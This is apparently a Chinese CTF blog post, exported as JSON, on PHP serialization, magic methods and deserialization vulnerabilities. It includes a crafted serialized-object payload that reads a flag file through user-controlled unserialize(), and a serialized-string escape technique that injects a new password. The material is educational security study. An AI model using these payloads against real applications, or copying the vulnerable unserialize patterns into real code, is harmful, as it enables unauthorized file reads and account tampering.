{"title":"序列化与反序列化","slug":"序列化与反序列化","date":"2019-12-12T03:47:20.000Z","updated":"2020-05-05T06:02:50.440Z","comments":true,"path":"api/articles/序列化与反序列化.json","photos":[],"link":"","excerpt":null,"covers":["https://i.imgur.com/pBO7lBu.png","https://i.imgur.com/bqenWI4.png","https://i.imgur.com/Eb6Ax4I.png","https://i.imgur.com/rAYet4u.png"],"content":"<h1 id=\"序列化与反序列化\"><a href=\"#序列化与反序列化\" class=\"headerlink\" title=\"序列化与反序列化\"></a>序列化与反序列化</h1><h2 id=\"0x01为什么要序列化\"><a href=\"#0x01为什么要序列化\" class=\"headerlink\" title=\"0x01为什么要序列化\"></a>0x01为什么要序列化</h2><p>php允许保存一个对象方便以后重用，这个过程称为序列化。在传递变量的过程中有可能遇到变量值跨脚本传输的过程。比如文件结构是这样的：</p>\n<p><img src=\"https://i.imgur.com/pBO7lBu.png\" alt></p>\n<p>其中index.php代码如下：</p>\n<pre><code>&lt;?php \n@highlight_file(__FILE__);\nrequire_once(&apos;shield.php&apos;);\n$x = new Shield();\nisset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\nif (!empty($g)) {\n    $x = unserialize($g);\n}\necho $x-&gt;readfile();\n?&gt;</code></pre><p>可以看出来$x就是跨脚本传输的变量。</p>\n<p>如果在一个脚本调用跨脚本传输的变量之前，前一个包含该变量的脚本已经执行结束所有的变量和内容都已经释放掉了，这时，我们不能让前一个脚本不断循环执行等待后面的脚本去调用。serialize和unserialize 就是解决这一问题的。serialize将变量转换为字符串并且在转换过程中保存当前变量的值;unserialize则将serialize生成的字符串变回成变量。</p>\n<p>看一个例子，简单的分析一下：</p>\n<pre><code>&lt;?php\nclass Test\n{\npublic $age = 0;\npublic $name = &apos;brain&apos;;\n\npublic function PrintInfo()\n{\n    echo &apos;[+]User: &apos;.$this-&gt;name .&apos;: is&apos; . $this-&gt;age .&apos;years old.&apos;;\n}\n}\n$user =  new Test();\n$user-&gt;age = 20;\n$user-&gt;name = &apos;Jack&apos;;\n$user-&gt;PrintInfo();\necho serialize($user);\n\n?&gt;</code></pre><p>输出结果如下</p>\n<p><img src=\"https://i.imgur.com/bqenWI4.png\" alt></p>\n<p>使用unserialize则会使这串<strong>字符串</strong>恢复成<strong>类对象</strong>。</p>\n<h2 id=\"魔法函数\"><a href=\"#魔法函数\" class=\"headerlink\" title=\"魔法函数\"></a>魔法函数</h2><p>一共有几个魔法函数需要注意，这是例子：</p>\n<pre><code>&lt;?php\nclass Test\n{\npublic $variable = &quot;BRAIN&quot;;\npublic $variable1 = &quot;BRAVO&quot;;\npublic function PrintVariable()\n{\n    echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;\n}\npublic function __construct()\n{\n    echo &apos;__construct&apos;.&apos;&lt;br&gt;&apos;;\n}\npublic function __destruct()\n{\n    echo &apos;__destruct&lt;br /&gt;&apos;;\n}\npublic function __wakeup()\n{\n    echo &apos;__wakeup&lt;br /&gt;&apos;;\n}\npublic function __sleep()\n{\n    echo &apos;__sleep&lt;br /&gt;&apos;;\n    return array(&apos;variable&apos; , &apos;variable1&apos;);\n}\n}    \n$obj = new Test();  //创建对象时调用__construct\n\n$serialized = serialize($obj); //序列化对象时调用__sleep\n\nprint(&apos;Serialized: &apos;.$serialized . &apos;&lt;br /&gt;&apos;);\n\n$obj2 = unserialize($serialized); //重建对象调用 __wakeup\n\n$obj2-&gt;PrintVariable(); //调用方法输出数据\n//脚本结束调用__destruct\n?&gt;</code></pre><p>这是执行结果：</p>\n<p><img src=\"https://i.imgur.com/Eb6Ax4I.png\" alt></p>\n<p>可以看到各个函数的执行顺序。</p>\n<h2 id=\"漏洞产生\"><a href=\"#漏洞产生\" class=\"headerlink\" title=\"漏洞产生\"></a>漏洞产生</h2><p>反序列化的危害就在于反序列化后的字符串参数被用户可控，从而在序列化之后造成不可预料的问题。</p>\n<p>拿一道ctf题举例，文件结构就是文章开头提到的结构</p>\n<pre><code>    idnex.php\n\n&lt;?php \n@highlight_file(__FILE__);\nrequire_once(&apos;shield.php&apos;);\n$x = new Shield();\nisset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\nif (!empty($g)) {\n    $x = unserialize($g);\n}\necho $x-&gt;readfile();\n?&gt;\n\n\nshield.php\n\n&lt;?php\n//flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n?&gt;</code></pre><p>我们可以看到index.php中先包含了shield.php，然后创建了一个新对象，在判断完get的变量之后进行反序列化，随后调用readfile()函数。<br>在shield.php中提示flag在pctf.php中，随后在readfile()函数中对$file进行一定过滤之后读文件内容。</p>\n<p>我们的想法就是控制$file的值为pctf.php</p>\n<pre><code>&lt;?php\n//flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n$a = new Shield(&quot;pctf.php&quot;);\necho serialize($a);\n?&gt;\n序列化结果\nO:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>然后我们就可以尝试传入这个字符串</p>\n<pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>就可以在源码中看到flag.</p>\n<p><img src=\"https://i.imgur.com/rAYet4u.png\" alt></p>\n<h2 id=\"ROP-Return-Oriented-programming-链\"><a href=\"#ROP-Return-Oriented-programming-链\" class=\"headerlink\" title=\"ROP(Return-Oriented programming)链\"></a>ROP(Return-Oriented programming)链</h2><p>这道题的攻击链比较简单。当我们传入序列化完成的字符串后，程序先对其反序列化生成一个对象，这时没有_wakeup()，_destruct()魔法函数，只是简单的反序列化，之后调用readfile()函数进行$file的内容的读取，而我们将$file的值设置为了pctf.php，于是我们得到了该文件的内容。<br>反序列化漏洞需要两个条件：</p>\n<blockquote>\n<p>1.存在序列化字符串的可控制点或者说是输入点</p>\n<p>2.存在可以利用的魔法函数</p>\n</blockquote>\n<h2 id=\"反序列化字符串逃逸\"><a href=\"#反序列化字符串逃逸\" class=\"headerlink\" title=\"反序列化字符串逃逸\"></a>反序列化字符串逃逸</h2><p>当我们在序列化过程中遇到过滤函数，这种过滤可能是</p>\n<ul>\n<li>过滤后长度增加</li>\n<li>过滤后长度减少</li>\n</ul>\n<p>当要反序列化的字符串长度发生变化时，就可能会出现字符串逃逸的问题。</p>\n<p>比如我现在有如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$username = <span class=\"string\">'luc1fer3'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ser = <span class=\"keyword\">array</span>($username,$pwd);</span><br><span class=\"line\">var_dump(serialize($ser)).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$b = replace(serialize($ser));</span><br><span class=\"line\">var_dump($b).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>执行结果：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(<span class=\"number\">41</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer3<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span></span><br><span class=\"line\">string(<span class=\"number\">42</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer22<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span> <span class=\"comment\">//属性长度仍然是 8</span></span><br></pre></td></tr></table></figure>\n\n<p>这是长度增加的情况。现在考虑一种情况：我们要求更改密码为 <code>admin888</code> ，该怎么做？</p>\n<p>首先我们知道如果字符串的长度与序列化后的属性长度不同，反序列化是会报错的</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:4:\"admin\";&#125;'</span>; <span class=\"comment\">//修改长度为4</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\">PHP Notice:  unserialize(): Error at offset <span class=\"number\">37</span> of <span class=\"number\">41</span> bytes</span><br><span class=\"line\">    bool(<span class=\"keyword\">false</span>)</span><br></pre></td></tr></table></figure>\n\n<p>并且，php 在反序列化时会把一些字符当作分隔符 <code>}</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:5:\"admin\";&#125;;i:2;s:2:\"ab\";&#125;'</span>; <span class=\"comment\">//识别到第一个 &#125; 之后就认为目标字符串结束，后面的会忽略掉。</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">array</span>(<span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">  [<span class=\"number\">0</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">8</span>) <span class=\"string\">\"luc1fer3\"</span></span><br><span class=\"line\">  [<span class=\"number\">1</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">5</span>) <span class=\"string\">\"admin\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>于是我们可以想到，如果我们自己构造一个特殊的字符串，手动闭合 <code>}</code> , 那我们就可以强行在反序列化之后塞入一个我们自己的属性。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$new_pwd = <span class=\"string\">'\";i:1;s:8:\"admin888\";&#125;'</span>; <span class=\"comment\">//length = 22 第一个双引号用来闭合 username</span></span><br></pre></td></tr></table></figure>\n\n<p>考虑到前面的过滤函数，我们的计划是设法使过滤后的长度增加（因为系列化后的字符串长度增加了，但是属性的长度并不变），让反系列化时系统读取的是过滤后增加的数据，然后把构造的数据变成新的属性：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;\";i:1;s:5:\"admin\";&#125;'</span> </span><br><span class=\"line\">    <span class=\"comment\">//注意这里我们根据构造的字符串长度增加了21个3，可以看到</span></span><br><span class=\"line\">    luc1fer3333333333333333333333<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125; </span></span><br><span class=\"line\"><span class=\"string\">    的长度是 8+21+22=73</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">' </span></span><br><span class=\"line\"><span class=\"string\">\t//过滤后51没变，但是</span></span><br><span class=\"line\"><span class=\"string\">luc1fer22222222222222222222222222222222222222222222\";i:1;s:8:\"admin888\";&#125;实际长度却变成了 8+21+22+22</span></span><br></pre></td></tr></table></figure>\n\n<p>每出现一个 3 就替换成 22 ,长度加 1 。 我们构造的字符串长度是 22 ，我们就需要使用 22 个(本来带的有一个，所以添加21个就可以) 3 来使长度增加22。</p>\n<p>从上面的例子可以看出，过滤后的属性长度51，在反系列化的时候刚好把替换后的数据读完，我们构造的数据闭合了双引号就逃逸出来变成新属性了。后面原来的属性会被忽略。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$username = <span class=\"string\">'luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = replace(serialize($ser));</span><br><span class=\"line\">var_dump($a).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">var_dump(unserialize($a));</span><br><span class=\"line\"></span><br><span class=\"line\">string(<span class=\"number\">107</span>) <span class=\"string\">\"a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">array(2) &#123;</span></span><br><span class=\"line\"><span class=\"string\">  [0]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(51) \"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">  [1]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(8) \"</span>admin888<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"}]}